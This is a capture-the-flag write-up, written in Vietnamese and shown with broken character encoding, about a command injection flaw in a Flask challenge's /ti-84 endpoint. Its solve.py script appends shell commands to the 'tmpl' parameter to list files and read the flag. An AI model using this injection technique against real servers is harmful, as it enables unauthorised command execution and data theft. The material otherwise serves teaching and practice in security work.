
![image](https://github.com/user-attachments/assets/5e5376be-2196-47fa-ba83-f091a8b23d3b)

Äáº§u tiÃªn thÃ¬ trong file server.py

ÄÃ¢y lÃ  má»™t á»©ng dá»¥ng web Flask.
ÄÆ°á»ng dáº«n /: Phá»¥c vá»¥ static/index.html.
ÄÆ°á»ng dáº«n /static:
Phá»¥c vá»¥ cÃ¡c file tÄ©nh, Ä‘áº·c biá»‡t lÃ  cÃ¡c file .tmpl.
NÃ³ kiá»ƒm tra xem fpath Ä‘Æ°á»£c yÃªu cáº§u cÃ³ tá»“n táº¡i trong thÆ° má»¥c static vÃ  káº¿t thÃºc báº±ng .tmpl hay khÃ´ng. Náº¿u khÃ´ng, nÃ³ máº·c Ä‘á»‹nh lÃ  ğŸˆ.tmpl.
CÃ³ má»™t kiá»ƒm tra vá» "quÃ¡ nhiá»u biá»ƒu tÆ°á»£ng cáº£m xÃºc" (cÃ¡c kÃ½ tá»± cÃ³ ord(c) > 127) trong URL.

![image](https://github.com/user-attachments/assets/09d51cda-72af-4fca-95eb-409d606bd03f)

/ti-84 chá»‰ nháº­n 2 thá»©: code vÃ  tmpl.

code pháº£i dÃ i > 3 kÃ½ tá»±. Náº¿u bÃªn trong cÃ³ sá»‘ vá»›i máº¥y dáº¥u +-*/ thÃ¬ bÃ¡o lá»—i

code Ä‘Æ°á»£c nhÃ©t vÃ´ code_tmpl.py rá»“i cháº¡y, nhÆ°ng bá»‹ RestrictedPython khÃ³a cháº·t: khÃ´ng cÃ³ built-ins

tmpl sáº½ táº¡o lá»‡nh curl kÃ©o file máº«u á»Ÿ /static. File Ä‘Ã³ báº¯t buá»™c pháº£i cÃ³ {{out}}

ChÆ°Æ¡ng trÃ¬nh ghi code vÃ o file táº¡m, cháº¡y báº±ng python

Sau cÃ¹ng, nÃ³ láº¥y káº¿t quáº£ vá»«a cháº¡y, nhÃ©t vÃ´ chá»— {{out}} trong template vÃ  tráº£ vá» cho mÃ¬nh.

Chá»‘t láº¡i thÃ¬ váº¥n Ä‘á» náº±m á»Ÿ dÃ²ng sá»‘ 37, biáº¿n url do ngÆ°á»i dÃ¹ng truyá»n vÃ o, vÃ  dÃ²ng 37 thá»±c thi cÃ¢u lá»‡nh, tá»« Ä‘Ã³ xáº£y ra lá»—i command injection khi chÃ¨n thÃªm lá»‡nh vÃ o sau, Ä‘áº¿n dÃ²ng 37 lÃ  dÃ²ng cÃ³ chá»©a hÃ m nguy hiá»ƒm

![image](https://github.com/user-attachments/assets/06ad1bb2-7a7c-439f-894f-1aa3f252cc60)

Äáº§u tiÃªn lÃ  file solve.py

```
import requests
import sys

target = sys.argv[1]
target = target.replace("http://", "").replace("https://", "")
target = "http://" + target


def exploit(cmd):
    return requests.get(target + "/ti-84", params={
        "code": "1+1",
        "tmpl": f"ğŸˆ.tmpl && {cmd} && echo "
    }).text

flag_path = exploit("dir").split("flag")[1].split(".txt")[0].strip()
flag_path = "flag" + flag_path + ".txt"
flag = exploit(f"type {flag_path}").split(".;,;.")[1].split("}")[0].strip()
print(f"Flag: .;,;.{flag}}}")
```

Táº­p lá»‡nh nÃ y thá»ƒ hiá»‡n má»™t lá»— há»•ng chÃ¨n lá»‡nh cÆ¡ báº£n.
NÃ³ nháº¯m má»¥c tiÃªu Ä‘iá»ƒm cuá»‘i /ti-84.
Tham sá»‘ tmpl Ä‘Æ°á»£c táº¡o Ä‘á»ƒ chÃ¨n cÃ¡c lá»‡nh báº±ng cÃ¡ch sá»­ dá»¥ng && vÃ  echo Ä‘á»ƒ trÃ­ch xuáº¥t thÃ´ng tin.
Äáº§u tiÃªn, nÃ³ sá»­ dá»¥ng dir Ä‘á»ƒ tÃ¬m tÃªn file flag (giáº£ sá»­ nÃ³ chá»©a "flag" vÃ  káº¿t thÃºc báº±ng ".txt").
Sau Ä‘Ã³, nÃ³ sá»­ dá»¥ng type Ä‘á»ƒ Ä‘á»c ná»™i dung cá»§a file flag.
Lá»— há»•ng á»Ÿ Ä‘Ã¢y náº±m á»Ÿ cÃ¡ch output_tmpl Ä‘Æ°á»£c sá»­ dá»¥ng trong lá»‡nh gá»i os.popen trong server.py mÃ  khÃ´ng cÃ³ sá»± lÃ m sáº¡ch thÃ­ch há»£p, 
cho phÃ©p chÃ¨n lá»‡nh thÃ´ng qua tham sá»‘ tmpl. Cá»¥ thá»ƒ, os.popen(f"curl.exe -s {url}").read() láº¥y url, bao gá»“m output_tmpl do ngÆ°á»i dÃ¹ng kiá»ƒm soÃ¡t, 
cho phÃ©p chÃ¨n lá»‡nh náº¿u output_tmpl chá»©a cÃ¡c kÃ½ tá»± meta cá»§a shell.

![image](https://github.com/user-attachments/assets/2857eb43-9843-4349-8c12-7b7d0e5e8b17)

Cháº¡y file lÃ  ra Ä‘Æ°á»£c flag

